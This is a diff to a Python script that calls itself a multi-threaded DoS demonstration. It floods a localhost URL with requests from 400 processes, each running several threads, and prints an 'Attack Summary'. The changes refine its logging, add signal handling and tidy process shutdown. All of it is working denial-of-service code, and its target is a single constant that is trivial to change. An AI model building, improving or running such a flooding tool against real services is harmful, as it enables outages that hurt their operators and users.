@@ -45,7 +45,7 @@ TARGET_URL = "http://localhost:8000/get_definition_service/?style=Shakespeare&wo
 # Statistics tracking
 # request_count = 0  # Removed: Now using shared Value
 # response_times = [] # Removed: Now using shared List
-summary_interval = 10  # Show summary every N requests
+summary_interval = 100  # Significantly increased for less frequent summaries
 lock = threading.Lock()  # Lock for thread-safe operations on shared variables
 
 # Configure session with connection pooling
@@ -95,17 +95,25 @@ def send_requests(stop_flag_value, request_count, response_times):  # Pass stop_
                 request_count.value += 1  # Increment the shared request count
                 response_times.append(response_time)  # Append to the shared response times
                 
-                # Only log detailed info at intervals to reduce spam
-                if request_count.value % summary_interval == 0:
-                    avg_time = statistics.mean(response_times[-summary_interval:])
-                    max_time = max(response_times[-summary_interval:])
-                    
-                    logger.info(f"Request #{request_count.value} | Status: {response.status_code} | "
-                                f"Last: {response_time:.4f}s | Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
-                    
-                    # Clear old response times to prevent memory buildup during long runs
-                    if len(response_times) > 1000:
-                        response_times[:] = response_times[-100:]  # Update the shared list
+                # Log *only* on error status codes or at summary intervals
+                if response.status_code >= 400 or request_count.value % summary_interval == 0:
+                    if len(response_times) >= summary_interval: # Ensure enough data
+                        avg_time = statistics.mean(response_times[-summary_interval:])
+                        max_time = max(response_times[-summary_interval:])
+                    else:
+                        avg_time = statistics.mean(response_times)
+                        max_time = max(response_times)
+
+                    log_message = (f"Request #{request_count.value} | Status: {response.status_code} | "
+                                   f"Last: {response_time:.4f}s | Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")
+
+                    if response.status_code >= 400:
+                        logger.warning(log_message) # Use warning level for errors
+                    else:
+                        logger.info(log_message)
+
+                if len(response_times) > 1000:
+                    response_times[:] = response_times[-100:]  # Update the shared list
 
             # Add a small delay to prevent overwhelming the system
             time.sleep(0.01)
@@ -129,11 +137,23 @@ def start_process(stop_flag, request_count, response_times):
         thread.start()
         threads.append(thread)
 
-    # Keep the process running until stop_flag is set
-    while not stop_flag.value:  # Check stop_flag.value here too
+    # Keep the process running and join threads on exit
+    while not stop_flag.value:
         time.sleep(0.1)
 
+    # Join threads before process exits
+    for thread in threads:
+        thread.join()
+
+def signal_handler(sig, frame):
+    print("\nStopping attack. Please wait...")
+    stop_flag.value = True  # Set the stop flag
+
+# Global variable (will be set in main)
+stop_flag = None
+
 def main():
+    global stop_flag  # Use the global stop_flag
     # Create a manager to share objects between processes
     manager = Manager()
     stop_flag = manager.Value('b', False)  # Shared boolean flag
@@ -142,6 +162,9 @@ def main():
 
     print(f"Starting multi-threaded DoS demonstration against {TARGET_URL}")
     print("Press Ctrl+C to stop the attack\n")
+
+    # Register the signal handler
+    signal.signal(signal.SIGINT, signal_handler)
 
     # Launch multiple processes
     NUM_PROCESSES = 400  # Number of processes to create
@@ -153,51 +176,38 @@ def main():
         process.start()
         processes.append(process)
 
-    try:
-        # Keep the main process alive but responsive to keyboard interrupts
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nStopping attack. Please wait...")
-        
-        # Set the stop flag to signal all processes to stop
-        stop_flag.value = True
-        
-        # More robust shutdown
-        for process in processes:
-            try:
-                process.join(timeout=1)  # Give processes time to exit
-            except multiprocessing.TimeoutError:
-                print(f"Process {process.pid} did not terminate in time.")
-                try:
-                    process.terminate()
-                    process.join(0.5)    # Give it a moment to terminate
-                    if process.is_alive():
-                        process.kill()   # Force kill if still alive
-                except Exception as e:
-                    print(f"Error terminating process {process.pid}: {e}")
+    # Keep the main process alive (signal handler will interrupt)
+    while not stop_flag.value:
+        time.sleep(1)
 
-        # Final statistics (check if response_times is not empty)
-        try:
-            if response_times:
-                avg_time = statistics.mean(response_times)
-                max_time = max(response_times)
-            else:
-                avg_time = 0
-                max_time = 0
-        except statistics.StatisticsError:
+    # Simplified process termination
+    for process in processes:
+        process.join(timeout=5)  # Give processes time to exit
+        if process.is_alive():
+            print(f"Force terminating process {process.pid}")
+            process.terminate()
+            process.join(1) # Short join after terminate
+            if process.is_alive():
+                process.kill() # Last resort
+
+    # Final statistics (check if response_times is not empty)
+    try:
+        if response_times:
+            avg_time = statistics.mean(response_times)
+            max_time = max(response_times)
+        else:
             avg_time = 0
             max_time = 0
+    except statistics.StatisticsError:
+        avg_time = 0
+        max_time = 0
         
-        print("\n" + "="*50)
-        print(f"Attack Summary:")
-        print(f"Total Requests: {request_count.value}")
-        print(f"Average Response Time: {avg_time:.4f}s")
-        print(f"Maximum Response Time: {max_time:.4f}s")
-        print("="*50)
-        
-        # Force exit to ensure all processes are terminated
-        os._exit(0)
+    print("\n" + "="*50)
+    print(f"Attack Summary:")
+    print(f"Total Requests: {request_count.value}")
+    print(f"Average Response Time: {avg_time:.4f}s")
+    print(f"Maximum Response Time: {max_time:.4f}s")
+    print("="*50)
 
 if __name__ == "__main__":
     main()
